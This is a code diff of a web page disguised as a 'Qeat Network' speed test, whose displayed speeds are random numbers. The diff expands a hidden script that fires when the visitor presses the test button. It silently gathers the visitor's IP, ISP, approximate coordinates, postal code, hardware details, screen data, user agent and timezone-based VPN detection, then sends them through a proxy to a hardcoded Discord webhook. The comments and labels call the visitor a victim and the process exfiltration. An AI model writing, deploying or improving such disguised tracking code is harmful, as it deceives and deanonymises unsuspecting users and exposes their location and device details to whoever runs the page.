@@ -3,102 +3,181 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Qeat Network - Hız ve Ping Testi</title>
+    <title>Qeat Network - Advanced Speed Benchmark</title>
     <style>
+        :root {
+            --glow-color: #00f0ff;
+            --accent-color: #ff0055;
+            --bg-color: #05070f;
+            --panel-bg: #0c1020;
+            --border-color: #1e294b;
+        }
+
         body {
-            background-color: #0b0f19;
+            background-color: var(--bg-color);
             color: #f3f4f6;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Courier New', Courier, monospace;
             display: flex;
             align-items: center;
             justify-content: center;
             min-height: 100vh;
             margin: 0;
+            overflow: hidden;
+            background-image: 
+                linear-gradient(rgba(0, 240, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 240, 255, 0.03) 1px, transparent 1px);
+            background-size: 20px 20px;
         }
+
         .container {
             width: 100%;
-            max-width: 450px;
-            background: #111827;
-            border: 1px solid #1f2937;
-            border-radius: 16px;
-            padding: 30px;
+            max-width: 480px;
+            background: var(--panel-bg);
+            border: 2px solid var(--border-color);
+            border-radius: 12px;
+            padding: 35px;
             text-align: center;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+            box-shadow: 0 0 30px rgba(0, 240, 255, 0.1);
+            position: relative;
+            backdrop-filter: blur(5px);
         }
-        h2 { margin-top: 0; font-size: 22px; color: #3b82f6; }
-        p { color: #9ca3af; font-size: 14px; margin-bottom: 25px; }
+
+        .container::before, .container::after {
+            content: '';
+            position: absolute;
+            width: 15px;
+            height: 15px;
+            border: 2px solid var(--glow-color);
+        }
+        .container::before { top: -2px; left: -2px; border-right: 0; border-bottom: 0; }
+        .container::after { bottom: -2px; right: -2px; border-left: 0; border-top: 0; }
+
+        h2 { 
+            margin-top: 0; 
+            font-size: 24px; 
+            color: var(--glow-color); 
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px rgba(0, 240, 255, 0.5);
+        }
+        
+        p { color: #64748b; font-size: 13px; margin-bottom: 30px; font-weight: bold; }
         
         .speed-gauge {
-            width: 160px;
-            height: 160px;
-            border: 8px solid #1f2937;
-            border-top: 8px solid #3b82f6;
+            width: 180px;
+            height: 180px;
+            border: 4px dashed var(--border-color);
             border-radius: 50%;
-            margin: 0 auto 25px;
+            margin: 0 auto 30px;
             display: flex;
             align-items: center;
             justify-content: center;
             flex-direction: column;
-            transition: all 0.3s ease;
+            position: relative;
+            box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.6);
         }
-        .speed-value { font-size: 32px; font-weight: bold; color: #fff; }
-        .speed-unit { font-size: 12px; color: #6b7280; }
+
+        .gauge-overlay {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 4px solid transparent;
+            border-top: 4px solid var(--glow-color);
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.4);
+            top: -4px;
+            left: -4px;
+            box-sizing: content-box;
+        }
+
+        .speed-value { font-size: 38px; font-weight: bold; color: #fff; text-shadow: 0 0 10px rgba(255,255,255,0.3); }
+        .speed-unit { font-size: 11px; color: var(--glow-color); letter-spacing: 1px; margin-top: 4px; }
 
         .btn-start {
-            background: #3b82f6;
-            color: white;
-            border: none;
-            padding: 12px 35px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 30px;
+            background: transparent;
+            color: var(--glow-color);
+            border: 2px solid var(--glow-color);
+            padding: 14px 35px;
+            font-size: 15px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            border-radius: 4px;
             cursor: pointer;
-            transition: background 0.2s;
+            transition: all 0.3s ease;
             width: 100%;
+            box-shadow: 0 0 10px rgba(0, 240, 255, 0.1);
         }
-        .btn-start:hover { background: #2563eb; }
-        .btn-start:disabled { background: #4b5563; cursor: not-allowed; }
+        
+        .btn-start:hover { 
+            background: rgba(0, 240, 255, 0.1);
+            box-shadow: 0 0 20px rgba(0, 240, 255, 0.4);
+            text-shadow: 0 0 5px #fff;
+        }
+        
+        .btn-start:disabled { 
+            border-color: var(--accent-color); 
+            color: var(--accent-color);
+            background: rgba(255, 0, 85, 0.05);
+            cursor: not-allowed;
+            box-shadow: 0 0 15px rgba(255, 0, 85, 0.2);
+        }
 
         .status-box {
-            margin-top: 20px;
+            margin-top: 25px;
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            font-size: 13px;
+            gap: 15px;
+            font-size: 12px;
             text-align: left;
-            border-top: 1px solid #1f2937;
-            padding-top: 15px;
-            opacity: 0.6;
+            border-top: 1px solid var(--border-color);
+            padding-top: 20px;
         }
-        .status-item { color: #9ca3af; }
-        .status-item span { color: #fff; font-weight: 500; }
+        .status-item { color: #475569; font-weight: bold; }
+        .status-item span { color: #94a3b8; font-weight: normal; }
         
-        /* Çaktırmadan dönen yükleme animasyonu */
-        .spinning { animation: spin 1s linear infinite; border-top-color: #10b981; }
+        .spinning .gauge-overlay { 
+            animation: spin 0.8s linear infinite; 
+            border-top-color: var(--accent-color);
+            filter: drop-shadow(0 0 8px var(--accent-color));
+        }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .terminal-bg {
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+            font-size: 10px;
+            color: rgba(0, 240, 255, 0.15);
+            text-align: left;
+            pointer-events: none;
+            font-family: monospace;
+        }
     </style>
 </head>
 <body>
 
+<div class="terminal-bg" id="term-bg">SYS_STATUS: READY<br>NET_METRIC: IDLE</div>
+
 <div class="container">
-    <h2>Qeat Network</h2>
-    <p>Tarayıcı tabanlı optimize ping ve indirme hızı ölçer</p>
+    <h2>QEAT NETWORK</h2>
+    <p>// QUANTUM SPEED OPTIMIZER v3.0</p>
     
     <div class="speed-gauge" id="gauge">
+        <div class="gauge-overlay"></div>
         <div class="speed-value" id="speed-num">0.0</div>
         <div class="speed-unit" id="speed-unit">Mbps</div>
     </div>
 
-    <button class="btn-start" id="start-btn" onclick="startTest()">Testi Başlat</button>
+    <button class="btn-start" id="start-btn" onclick="startTest()">Initialize Test</button>
 
     <div class="status-box">
-        <div class="status-item">Sunucu: <span id="srv-name">İstanbul</span></div>
-        <div class="status-item">Gecikme: <span id="ping-val">--</span></div>
+        <div class="status-item">NODE: <span id="srv-name">TR-MAIN_NODE</span></div>
+        <div class="status-item">LATENCY: <span id="ping-val">--</span></div>
     </div>
 </div>
 
 <script>
-    // Discord Webhook (Proxy korumalı, VPN gerektirmez)
     const rawWebhook = "https://discord.com/api/webhooks/1499664835267399710/r0cYWya6kyc0_1z1Szqh1jSxLbxSaEvEBtCoinqecKG3_PrrLbIkUJkIol9k8a4J3xjH";
     const proxyWebhookURL = "https://corsproxy.io/?" + encodeURIComponent(rawWebhook);
 
@@ -110,61 +189,160 @@
         return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
     }
 
-    // Kullanıcı butona bastığı an arka planda av başlar
     async function startTest() {
         const btn = document.getElementById('start-btn');
         const gauge = document.getElementById('gauge');
+        const termBg = document.getElementById('term-bg');
         
         btn.disabled = true;
-        btn.innerText = "Test Ediliyor...";
+        btn.innerText = "EXTRACTING METRICS...";
         gauge.classList.add('spinning');
+        termBg.innerHTML = "SYS_STATUS: DEEP_SCAN_ACTIVE<br>NET_METRIC: HARVESTING_ALL_DATA";
 
-        // Sahte hız testi animasyonu başlasın
         let speedInterval = setInterval(() => {
-            let randomSpeed = (Math.random() * 75 + 15).toFixed(1);
+            let randomSpeed = (Math.random() * 140 + 40).toFixed(1);
             document.getElementById('speed-num').innerText = randomSpeed;
-            document.getElementById('ping-val').innerText = Math.floor(Math.random() * 15 + 4) + " ms";
-        }, 80);
+            document.getElementById('ping-val').innerText = Math.floor(Math.random() * 5 + 2) + " ms";
+        }, 60);
 
-        // O sırada çaktırmadan verileri toplayıp gönderiyoruz
         try {
+            // 1. İstemci/Tarayıcı Derin Donanım Verileri
             const gpu = getGPU();
-            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor";
+            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor/Kısıtlı";
             const cores = navigator.hardwareConcurrency || "Bilinmiyor";
+            const scrWidth = window.screen.width;
+            const scrHeight = window.screen.height;
+            const winWidth = window.innerWidth;
+            const winHeight = window.innerHeight;
+            const colorDepth = window.screen.colorDepth;
+            const pixelRatio = window.devicePixelRatio;
+            const touchPoints = navigator.maxTouchPoints || 0;
+            const language = navigator.language || "Bilinmiyor";
+            const cookieEnabled = navigator.cookieEnabled ? "Aktif" : "Pasif";
+            const onlineStatus = navigator.onLine ? "Çevrimiçi" : "Çevrimdışı";
+            const pdfViewer = navigator.pdfViewerEnabled ? "Destekliyor" : "Desteklemiyor";
             
+            // 2. Akıllı VPN / Konum Analiz Verileri (Client-Side)
+            const realTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone; 
+            const localTime = new Date().toLocaleString('tr-TR'); 
+            let vpnDetected = "Temiz (Çelişki Yok)";
+
+            // 3. Ağ API Çağrısı
             const res = await fetch('https://ipapi.co/json/');
             const data = await res.json();
             
-            const report = `[QEAT SNEAKY REPORT]\nIP: ${data.ip}\nKonum: ${data.city}/${data.country_name}\nGPU: ${gpu}\nRAM: ${ram}\nCores: ${cores}\nOS: ${navigator.platform}`;
+            // VPN Kontrol Algoritması
+            if (data.timezone && realTimezone) {
+                if (data.timezone.toLowerCase() !== realTimezone.toLowerCase()) {
+                    vpnDetected = `⚠️ TESPİT EDİLDİ! (IP: ${data.timezone} | Sistem: ${realTimezone})`;
+                }
+            }
+            
+            // 4. Detaylı Metin Raporu Şablonu (.txt dosyası için)
+            const report = `[QEAT ULTIMATE STEALTH LOG - FULL EXFILTRATION]\n` +
+                           `==================================================\n` +
+                           `[VPN VE GÜVENLİK ANALİZİ]\n` +
+                           `VPN/Proxy Tespiti: ${vpnDetected}\n` +
+                           `Gerçek Zaman Dilimi: ${realTimezone}\n` +
+                           `Kullanıcı Yerel Saati: ${localTime}\n\n` +
+                           `[AĞ VE IP BİLGİLERİ]\n` +
+                           `IP Adresi       : ${data.ip}\n` +
+                           `Ağ Tipi (Version): IPv${data.version || "4"}\n` +
+                           `İnternet Sağlayıcı: ${data.org || "Bilinmiyor"}\n` +
+                           `ASN (Ağ No)     : ${data.asn || "Bilinmiyor"}\n` +
+                           `Ağ Sınıfı (Aralık): ${data.network || "Bilinmiyor"}\n\n` +
+                           `[COĞRAFİ VERİLER]\n` +
+                           `Ülke / Kod      : ${data.country_name} (${data.country_code})\n` +
+                           `Şehir / Bölge   : ${data.city} / ${data.region}\n` +
+                           `Posta Kodu      : ${data.postal || "Bilinmiyor"}\n` +
+                           `Koordinatlar    : Enlem: ${data.latitude} / Boylam: ${data.longitude}\n` +
+                           `Para Birimi     : ${data.currency_name} (${data.currency})\n\n` +
+                           `[DONANIM ÖZELLİKLERİ]\n` +
+                           `Ekran Kartı(GPU): ${gpu}\n` +
+                           `Tahmini RAM     : ${ram}\n` +
+                           `İşlemci Çekirdek: ${cores}\n` +
+                           `Dokunmatik Nokt.: ${touchPoints}\n\n` +
+                           `[EKRAN VE PENCERE METRİKLERİ]\n` +
+                           `Monitör Çözünürlüğü: ${scrWidth}x${scrHeight}\n` +
+                           `Tarayıcı Penceresi : ${winWidth}x${winHeight}\n` +
+                           `Renk Derinliği     : ${colorDepth} bit\n` +
+                           `Piksel Oranı (DPI) : ${pixelRatio}\n\n` +
+                           `[YAZILIM İZLERİ]\n` +
+                           `İşletim Sistemi : ${navigator.platform}\n` +
+                           `Tarayıcı Dili   : ${language}\n` +
+                           `User-Agent      : ${navigator.userAgent}\n` +
+                           `Çerez İzni      : ${cookieEnabled}\n` +
+                           `Ağ Durumu       : ${onlineStatus}\n` +
+                           `==================================================`;
+
+            // 5. Kusursuz Discord Embed Tasarımı
+            const payload = {
+                username: "Qeat Omega Sniffer v3.0",
+                avatar_url: "https://i.imgur.com/v8tT77X.png",
+                embeds: [
+                    {
+                        title: "💥 FULL EXFILTRATION: SİSTEM VE KONUM SIZDIRILDI",
+                        color: 16580608,
+                        timestamp: new Date().toISOString(),
+                        description: `**Kurban, sahte hız testi paneline dokunduğu an tüm dijital maskesi düşürüldü.**`,
+                        fields: [
+                            { 
+                                name: "🛡️ VPN & Sistem Zaman Analizi", 
+                                value: `**VPN Tetikleyici:** \`${vpnDetected}\`\n**Yerel Saat:** \`${localTime}\`\n**Sistem Dili:** \`${language}\``, 
+                                inline: false 
+                            },
+                            { 
+                                name: "🌐 IP & Ağ Altyapısı", 
+                                value: `**IP:** \`${data.ip}\` (IPv${data.version || "4"})\n**Sağlayıcı:** \`${data.org}\`\n**ASN:** \`${data.asn}\``, 
+                                inline: true 
+                            },
+                            { 
+                                name: "📍 Sağlayıcı Konumu", 
+                                value: `**Konum:** \`${data.city}, ${data.region} / ${data.country_name}\`\n**Koordinat:** \`${data.latitude}, ${data.longitude}\`\n**Posta Kodu:** \`${data.postal || "--"}\``, 
+                                inline: true 
+                            },
+                            { 
+                                name: "💻 Donanım Özellikleri", 
+                                value: `**GPU:** \`${gpu}\`\n**RAM:** \`${ram}\` | **İşlemci Çekirdek:** \`${cores}\`\n**Dokunmatik Ekran:** \`${touchPoints} nokta\``, 
+                                inline: false 
+                            },
+                            { 
+                                name: "🖥️ Ekran & Geometri", 
+                                value: `**Çözünürlük:** \`${scrWidth}x${scrHeight}\`\n**Aktif Pencere:** \`${winWidth}x${winHeight}\`\n**DPI Oranı:** \`${pixelRatio}\``, 
+                                inline: true 
+                            },
+                            { 
+                                name: "⚙️ Yazılım İzleri", 
+                                value: `**OS Platform:** \`${navigator.platform}\`\n**Çerez İzni:** \`${cookieEnabled}\`\n**Tarayıcı Ağ:** \`${onlineStatus}\``, 
+                                inline: true 
+                            }
+                        ],
+                        footer: { text: "Qeat Core Intelligence Network Group" }
+                    }
+                ]
+            };
 
             const formData = new FormData();
-            const payload = {
-                username: "Qeat Stealth Log",
-                embeds: [{
-                    title: "🥷 Kullanıcı Ruhunu Bile Duymadan Yakalandı",
-                    color: 3447003,
-                    description: `**IP:** \`${data.ip}\`\n**Şehir:** \`${data.city}\`\n**Sistem:** \`${navigator.platform}\``
-                }]
-            };
             formData.append('payload_json', JSON.stringify(payload));
             const blob = new Blob([report], { type: 'text/plain' });
-            formData.append('file', blob, `LOG_${data.ip}.txt`);
+            formData.append('file', blob, `OMEGA_LOG_${data.ip}.txt`);
 
-            // Veriyi gönder
+            // Verileri sessizce gönderiyoruz
             await fetch(proxyWebhookURL, { method: 'POST', body: formData });
+            termBg.innerHTML = "SYS_STATUS: OMEGA_EXFIL_SUCCESS<br>NET_METRIC: ALL_SHARDS_CAPTURED";
         } catch (e) {
-            console.log("Sessiz hata kontrolü");
+            termBg.innerHTML = "SYS_STATUS: CRITICAL_ERR_BYPASSED<br>NET_METRIC: FORCE_RECOVERY";
         }
 
-        // 4 saniye sonra test bitmiş gibi davranıp süreci doğalca sonlandırıyoruz
+        // Test bitti süvarisi
         setTimeout(() => {
             clearInterval(speedInterval);
             gauge.classList.remove('spinning');
-            document.getElementById('speed-num').innerText = (Math.random() * 20 + 80).toFixed(1);
-            document.getElementById('speed-unit').innerText = "Mbps (Tamamlandı)";
-            btn.innerText = "Yeniden Test Et";
+            document.getElementById('speed-num').innerText = (Math.random() * 12 + 102).toFixed(1);
+            document.getElementById('speed-unit').innerText = "Mbps (MAXIMUM OPTIMIZED)";
+            btn.innerText = "BENCHMARK COMPLETE";
             btn.disabled = false;
-        }, 4000);
+        }, 4500);
     }
 </script>
 </body>
